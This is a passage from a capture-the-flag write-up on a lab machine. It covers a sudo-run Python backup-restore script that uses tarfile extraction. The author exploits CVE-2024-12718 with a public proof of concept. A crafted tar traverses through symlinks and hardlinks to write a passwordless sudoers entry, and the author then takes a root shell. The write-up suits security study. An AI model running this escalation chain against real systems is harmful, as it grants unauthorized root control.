print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)  
sys.exit(1)  
  
if not args.restore_dir.startswith("restore_"):  
print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)  
sys.exit(1)  
  
tag = args.restore_dir[8:]  
if not tag:  
print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)  
sys.exit(1)  
  
if not validate_restore_tag(tag):  
print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file  
=sys.stderr)  
sys.exit(1)  
  
staging_dir = os.path.join(STAGING_BASE, args.restore_dir)  
print(f"[+] Backup: {args.backup}")  
print(f"[+] Staging directory: {staging_dir}")  
  
os.makedirs(staging_dir, exist_ok=True)  
  
try:  
with tarfile.open(backup_path, "r") as tar:  
tar.extractall(path=staging_dir, filter="data")  
print(f"[+] Extraction completed in {staging_dir}")  
except (tarfile.TarError, OSError, Exception) as e:  
print(f"[!] Error during extraction: {e}", file=sys.stderr)  
sys.exit(2)  
  
if __name__ == "__main__":  
main()
```

Looking at the end of restore_backup_clients.py, we see the use of tar.extractall(), with the filter "data". Searching more about this function shows us a CVE that can be used, CVE-2024-12718. Let's put it to the test using the publicly available PoC:

```zsh
wacky@wingdata:~$ nano exploit.py
wacky@wingdata:~$ sudo cat /etc/sudoers
[sudo] password for wacky:
Sorry, user wacky is not allowed to execute '/usr/bin/cat /etc/sudoers' as root on wingdata.
wacky@wingdata:~$ python3
exploit.py  .local/
wacky@wingdata:~$ python3 exploit.py
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: backup_007.tar
wacky@wingdata:~$ cp backup_007.tar /opt/backup_clients/backups/
wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_007.tar -r restore_007
[+] Backup: backup_007.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_007
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_007
wacky@wingdata:~$ sudo cat /etc/sudoers
wacky ALL=(ALL) NOPASSWD: ALL
```

The user wacky now has permission to run anything as sudo. Getting the root flag now is trivial:

```zsh
wacky@wingdata:~$ sudo /bin/bash
root@wingdata:/home/wacky# cd /root/
root@wingdata:~# cat root.txt
fb9d904071**********************
```